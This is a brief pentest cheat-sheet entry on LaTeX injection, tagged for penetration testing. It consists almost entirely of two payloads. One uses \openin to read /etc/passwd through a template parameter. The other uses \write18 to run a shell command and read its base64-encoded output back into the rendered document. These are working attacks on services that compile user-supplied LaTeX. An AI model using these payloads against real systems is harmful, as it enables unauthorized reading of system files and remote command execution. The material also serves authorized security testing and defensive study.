# Latex Injection

## General

* https://0day.work/hacking-with-latex/

```bash read file
content=\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file&template=test2
```

```bash execute command
\immediate\write18{ls|base64 > test.txt}
\newread\file
\openin\file=test.txt
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
```

tags: latex pentest
